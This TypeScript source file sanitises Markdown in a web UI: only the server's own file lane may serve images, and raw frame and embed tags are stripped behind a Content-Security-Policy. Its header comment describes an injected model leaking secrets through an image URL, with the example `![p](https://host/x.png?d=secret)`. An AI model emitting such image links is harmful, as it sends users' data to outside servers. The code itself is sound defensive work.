// SPDX-FileCopyrightText: 2026 Veyllo GmbH
// SPDX-License-Identifier: AGPL-3.0-or-later
// Additional permissions and terms under AGPL Section 7: see LICENSING.md
/**
 * Images in Markdown load only from this server's file lane; every other image is shown as a
 * link or as its alt text.
 *
 * Markdown the UI renders is untrusted text: a reply the model wrote (and the model can be
 * steered by any page or mail it read), a file an agent wrote, an attached document, a third
 * party's model card. An image in it is fetched by the browser the moment it is shown, so
 * `![p](https://host/x.png?d=secret)` sends whatever sits in that address to a foreign server
 * merely because someone looked at a reply. VAF itself never writes a Markdown image: pictures
 * it means to show arrive as files (attachments, file chips, the screenshot strip). The only
 * image a Markdown text may load is therefore a file on this machine, served by `/api/file`,
 * where the per-user file isolation is enforced.
 *
 * One decision (`ownImageSrc`) serves every renderer: the react-markdown wrapper
 * (`web/components/Markdown.tsx`, through `rehypeOwnImagesOnly`), the attached-document viewer
 * (`renderMarkdownDocument`) and, as a backstop for raw HTML inside Markdown that no rewrite
 * sees, the policy of the frames that show Markdown (`markdownFramePolicy`). The Document
 * Editor keeps its pictures as written (`renderMarkdownForEditor`), because its markup is written
 * back into the user's file on save; its frame carries the policy instead.
 *
 * Both document renderers also drop raw frame, object and head elements (`stripRawEmbeds`): the
 * frame policy blocks an inline frame's navigation, but Chromium still resolves the host and opens
 * a connection first (measured), which tells a foreign server that and when the file was opened.
 */
import { Marked, type Tokens, type Token } from 'marked';
// Type-only: @types/hast comes with react-markdown, which depends on it; not a direct dependency.
import type { Element, ElementContent, Root, RootContent } from 'hast';
import { getApiBase } from '@/lib/utils';

/** Turns a sandbox path or an absolute host path into the file lane's URL; anything else is returned as it is. */
export const normalizeDownloadHref = (rawHref: string): string => {
    if (!rawHref) return rawHref;
    const base = getApiBase();
    if (rawHref.startsWith('sandbox:/')) {
        const path = rawHref.replace(/^sandbox:\/*/, '');
        return `${base}/api/file?path=${encodeURIComponent(path)}`;
    }

    const looksLikeWindowsPath = /^[a-zA-Z]:[\\/]/.test(rawHref);
    const looksLikeUnixPath = rawHref.startsWith('/');
    if (looksLikeWindowsPath || looksLikeUnixPath) {
        return `${base}/api/file?path=${encodeURIComponent(rawHref)}`;
    }

    return rawHref;
};

// Fixed bases instead of `window.location`: the server render and the client render must agree,
// and a srcdoc frame has a base of its own. Both schemes are tried because a browser reads
// `https:host/x` as a path on an https page and as another host on an http page; https first, so
// a protocol-relative `//host/x` is shown as its https address.
const OWN_BASES = ['https://own.invalid/', 'http://own.invalid/'];
const OWN_FILE_LANE = '/api/file';

function resolveAll(candidate: string): URL[] | null {
    try {
        return OWN_BASES.map((base) => new URL(candidate, base));
    } catch {
        return null;
    }
}

/**
 * The address an image in Markdown is shown as a link to: an absolute http(s) URL of another
 * host, also when written protocol-relative (`//host/x`, `/\host/x`) or scheme-relative
 * (`https:host/x`). Null for a path on this server and for every other scheme.
 */
export function imageLinkHref(src: string | null | undefined): string | null {
    const raw = (src ?? '').trim();
    if (!raw) return null;
    const urls = resolveAll(raw);
    if (!urls) return null;
    for (let i = 0; i < urls.length; i++) {
        const url = urls[i];
        const base = new URL(OWN_BASES[i]);
        if ((url.protocol === 'http:' || url.protocol === 'https:') && url.host !== base.host) {
            return url.href;
        }
    }
    return null;
}

/**
 * THE decision: the `/api/file` address an image in Markdown may load from, or null when it
 * must not load at all. The image is the file lane on this server (`/api/file?path=...`), or a
 * sandbox or host path the links already send there (`normalizeDownloadHref`). Returned as an
 * absolute path, so it resolves the same on every page and inside a srcdoc frame. Every web
 * address, this server's included when written with a host, and every other path and scheme is
 * refused.
 */
export function ownImageSrc(src: string | null | undefined): string | null {
    const raw = (src ?? '').trim();
    if (!raw || imageLinkHref(raw) !== null) return null;
    for (const candidate of [raw, normalizeDownloadHref(raw)]) {
        const urls = resolveAll(candidate);
        if (!urls) continue;
        const own = urls.every((url, i) => url.origin === new URL(OWN_BASES[i]).origin && url.pathname === OWN_FILE_LANE);
        if (!own) continue;
        // Every `path` value, because the server reads the last one and URLSearchParams the first.
        if (urls[0].searchParams.getAll('path').some(isRemoteFilePath)) return null;
        return urls[0].pathname + urls[0].search;
    }
    return null;
}

/**
 * A file path that names a network share or a Windows device namespace (`\\host\share`,
 * `//host/share`, `\\?\`, `\\.\`, `\??\`). On Windows the server opening it is an SMB
 * connection to that host, so such a picture is not an own one. The server refuses the same
 * spellings (`is_remote_path` in `vaf/core/path_jail.py`).
 */
function isRemoteFilePath(path: string): boolean {
    const norm = path.trimStart().replace(/\\/g, '/');
    return norm.startsWith('//') || norm.startsWith('/??/');
}

function hastText(value: string): ElementContent {
    return { type: 'text', value };
}

function rewriteImages(parent: Root | Element, insideLink: boolean): void {
    const children = parent.children as Array<RootContent | ElementContent>;
    for (let i = 0; i < children.length; i++) {
        const child = children[i];
        if (child.type !== 'element') continue;
        if (child.tagName !== 'img') {
            rewriteImages(child, insideLink || child.tagName === 'a');
            continue;
        }
        const props = child.properties || {};
        const src = typeof props.src === 'string' ? props.src : '';
        const alt = typeof props.alt === 'string' ? props.alt : '';
        const own = ownImageSrc(src);
        if (own !== null) {
            child.properties = { ...props, src: own };
            continue;
        }
        const href = imageLinkHref(src);
        if (insideLink) {
            // A link inside a link is not valid HTML; the outer link stays, the picture is its text.
            children[i] = hastText(alt || href || '');
        } else if (href !== null) {
            children[i] = {
                type: 'element',
                tagName: 'a',
                properties: { href, dataImageLink: true },
                children: [hastText(alt || href)],
            };
        } else {
            children[i] = hastText(alt);
        }
    }
}

/**
 * rehype plugin for react-markdown: an own image keeps its `img` with the file lane address; any
 * other image becomes a link to its web address (`data-image-link`, labelled with its alt text or
 * the address), or plain alt text. Runs before react-markdown's own URL filter, which stays on.
 */
export function rehypeOwnImagesOnly() {
    return (tree: Root) => {
        rewriteImages(tree, false);
    };
}

/**
 * Escapes text from Markdown for HTML. `keepEntities` leaves an `&` that already starts a
 * character reference alone, as Markdown does (`a &amp; b` reads "a & b", not "a &amp; b").
 */
function escapeHtml(text: string, keepEntities = false): string {
    return text
        .replace(keepEntities ? /&(?!#?[a-zA-Z0-9]+;)/g : /&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function textInsteadOfImages(tokens: Token[] | undefined): void {
    if (!tokens) return;
    for (let i = 0; i < tokens.length; i++) {
        const token = tokens[i];
        if (token.type === 'image') {
            const image = token as Tokens.Image;
            if (ownImageSrc(image.href) !== null) continue;
            const label = image.text || imageLinkHref(image.href) || '';
            tokens[i] = { type: 'text', raw: image.raw, text: label } as Tokens.Text;
            continue;
        }
        if ('tokens' in token) textInsteadOfImages((token as Tokens.Generic).tokens);
    }
}

// Raw HTML elements a Markdown document may not carry into its frame: frames and plugins
// connect to their host even when the frame policy blocks them, and the head elements (a
// stylesheet, a refresh, a base) are not the document's to set.
const RAW_EMBED = /<\/?\s*(?:iframe|frame|frameset|object|embed|applet|portal|link|meta|base)\b[^>]*>?/gi;

/**
 * Raw HTML from a Markdown file without those elements. Repeated until nothing changes, so a
 * tag that only forms once another is cut out (`ifr` + a whole frame tag + `ame`) goes as well. Text outside
 * raw HTML never needs this: marked escapes it.
 */
export function stripRawEmbeds(html: string): string {
    let out = html;
    for (let previous = ''; previous !== out;) {
        previous = out;
        out = out.replace(RAW_EMBED, '');
    }
    return out;
}

// The picture icon of the UI (lucide's image), inline because a document frame loads nothing.
const IMAGE_GLYPH = '<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" '
    + 'stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" '
    + 'style="display:inline-block;vertical-align:-0.125em;margin-right:0.25em">'
    + '<rect width="18" height="18" x="3" y="3" rx="2" ry="2"/><circle cx="9" cy="9" r="2"/>'
    + '<path d="m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21"/></svg>';

// Local instances: `marked.use()` would change the shared one every other importer gets.
const documentMarked = new Marked({
    gfm: true,
    async: false,
    walkTokens(token) {
        if (token.type === 'link') textInsteadOfImages((token as Tokens.Link).tokens);
    },
    renderer: {
        image({ href, text }: Tokens.Image) {
            const own = ownImageSrc(href);
            const label = escapeHtml(text || '', true);
            if (own !== null) return `<img src="${escapeHtml(own)}" alt="${label}">`;
            const link = imageLinkHref(href);
            if (link !== null) {
                return `<a href="${escapeHtml(link)}" target="_blank" rel="noopener noreferrer" title="${escapeHtml(link)}">`
                    + `${IMAGE_GLYPH}${label || escapeHtml(link)}</a>`;
            }
            return label;
        },
        html({ text }: Tokens.HTML | Tokens.Tag) {
            return stripRawEmbeds(text);
        },
    },
});

const editorMarked = new Marked({
    gfm: true,
    breaks: false,
    async: false,
    renderer: {
        html({ text }: Tokens.HTML | Tokens.Tag) {
            return stripRawEmbeds(text);
        },
    },
});

/** HTML for an attached Markdown document (DocumentViewer), with the image rule applied. */
export function renderMarkdownDocument(md: string): string {
    return documentMarked.parse(md, { async: false }) as string;
}

/**
 * HTML for a Markdown file opened in the Document Editor. Pictures stay as written: the editor
 * saves its markup back into the file, so a rewritten picture would be written into the user's
 * file; its frame carries `markdownFramePolicy` instead. The raw embeds are dropped
 * (`stripRawEmbeds`), which costs the file nothing: the save's conversion back to Markdown
 * (`markdownify` behind `/api/file/save`) drops those elements anyway (measured; at most two
 * spaces around an inline frame become one, which Markdown renders the same). An iframe
 * left unclosed is the one difference, and there the file keeps more: unstripped, everything
 * after it was the frame's fallback text, which the save dropped with it.
 */
export async function renderMarkdownForEditor(md: string): Promise<string> {
    return editorMarked.parse(md) as string;
}

const ORIGIN_SHAPE = /^https?:\/\/[A-Za-z0-9.\-[\]:]+$/;

/**
 * The `<meta>` policy for a frame that shows Markdown: images and media only from this server's
 * file lane (a source path without a trailing slash matches that one path, so no other GET of
 * this server can be triggered from the frame) and inline data; no scripts, frames, objects or
 * connections; styles inline and from the stylesheet host the document viewer uses. It is the
 * backstop for raw HTML in a Markdown file (`<img>`, `srcset`, `<picture>`, `<video poster>`,
 * inline frames, CSS `url()`), which no Markdown rewrite sees. An origin that is not a plain web
 * origin is left out, so the frame then loads no file either.
 */
export function markdownFramePolicy(origin: string): string {
    const own = ORIGIN_SHAPE.test(origin) ? `${origin}${OWN_FILE_LANE} ` : '';
    const policy = [
        "default-src 'none'",
        `img-src ${own}data: blob:`,
        `media-src ${own}data: blob:`,
        "style-src 'unsafe-inline' https://cdnjs.cloudflare.com",
        'font-src data:',
        "base-uri 'none'",
        "form-action 'none'",
    ].join('; ');
    return `<meta http-equiv="Content-Security-Policy" content="${policy}"/>`;
}
